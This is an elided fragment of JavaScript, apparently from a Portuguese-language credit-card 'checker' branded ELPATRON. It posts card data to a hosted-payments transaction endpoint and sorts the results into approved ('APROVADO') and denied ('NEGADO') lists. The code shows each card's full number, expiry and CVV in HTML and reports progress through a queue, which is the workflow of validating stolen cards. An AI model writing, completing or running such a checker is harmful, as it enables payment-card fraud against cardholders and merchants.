                    ...
                    axios.post(`https://transaction.hostedpayments.com/?TransactionSetupID=${code}`, data, {
                        ...
                        switch (result.trim()) {
                            case 'Call Issuer':
                                 ...
                                 let aPROV = '<a href="#">' +  cards[i].card.number + '|' + cards[i].card.mes + '|' + cards[i].card.ano + '|' + cards[i].card.cvv + '  </a><span class="label label-sm label-success">APROVADO</span> <span class="label label-sm label-info">ELPATRON</span>'
                                Queue.sendToQueue(false, '#' + id + 'aprovados', 1)
                                Queue.sendToQueue(false, '#' + id + 'listaprovados', aPROV)
                                Queue.sendToQueue(false, '#' + id + 'testados', 1)
                                Queue.sendToQueue(false, '#' + id + 'atividade',  'ELPATRON, Card verificado  Aguarde....')
                            ...
                            default:
                                ...
                                let n = '<a href="#">' + cards[i].card.number + '|' + cards[i].card.mes + '|' + cards[i].card.ano + '|' + cards[i].card.cvv + '  </a><span class="label label-sm label-danger">NEGADO</span> <span class="label label-sm label-warning">ELPATRON</span>'
                                Queue.sendToQueue(false, '#' + id + 'listreprovados', n)
                                Queue.sendToQueue(false, '#' + id + 'atividade', 'ELPATRON, Card verificado  Aguarde.....')
